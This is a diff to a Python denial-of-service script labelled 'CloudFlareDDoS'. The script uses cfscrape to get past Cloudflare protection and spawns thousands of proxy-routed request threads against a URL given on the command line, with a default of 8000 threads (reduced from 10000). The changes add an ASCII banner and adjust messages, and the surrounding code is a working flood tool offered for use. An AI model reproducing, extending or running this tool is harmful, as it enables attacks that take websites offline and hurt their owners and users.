@@ -1,7 +1,24 @@
 import urllib.request, os, threading, time, random, sys, requests
 import cfscrape
 from colorama import Fore, Style
-
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+print(" ")
+print("\033[90m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
+print("\033[91m   ________                __________                ____  ____       _____ \033[0m")
+print("\033[92m  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/ \033[0m")
+print("\033[93m / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \  \033[0m")
+print("\033[94m/ /___/ / /_/ / /_/ / /_/ / __/ / / /_/ / /  /  __/ /_/ / /_/ / /_/ /__/ /  \033[0m")
+print("\033[95m\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\____/____/   \033[0m")
+print("\033[96m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
+print(" ")
+print(" ")
 if len(sys.argv)==1:
     sys.exit(Fore.GREEN+'Usage: '+Fore.WHITE + sys.argv[0] +Fore.YELLOW+ ' [url] [thread]'+Style.RESET_ALL+Fore.RESET)
 
@@ -468,7 +485,7 @@ acceptall = [
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		]  
+		]       
 class sender(threading.Thread):
 
     def __init__(self, url, number, proxy):
@@ -487,7 +504,7 @@ class sender(threading.Thread):
         urllib.request.install_opener(opener)
         req = urllib.request.Request(self.url, data, self.headers, self.accept)
         urllib.request.urlopen(req) 
-        print(Fore.GREEN+'Connected : '+Fore.CYAN+'%s\r' % self.url) 
+        print(Fore.GREEN+'Connected: '+Fore.CYAN+'%s\r' % self.url) 
         
              
         
@@ -498,7 +515,7 @@ class sender(threading.Thread):
             try:
                 self.request()               
             except:
-                sys.stdout.write(Fore.RED+'Connect : '+Fore.BLUE+'Fail !\n')
+                sys.stdout.write(Fore.RED+'Connect: '+Fore.BLUE+'fail!\n')
                 sys.exit(0)
 
         sys.exit(0)
@@ -523,7 +540,7 @@ class MainLoop:
             else:
                 num_threads = sys.argv[2]
                 if num_threads == '':
-                    num_threads = int(10000)
+                    num_threads = int(8000)
                 else:
                     num_threads = int(num_threads)
                 for i in range(num_threads):
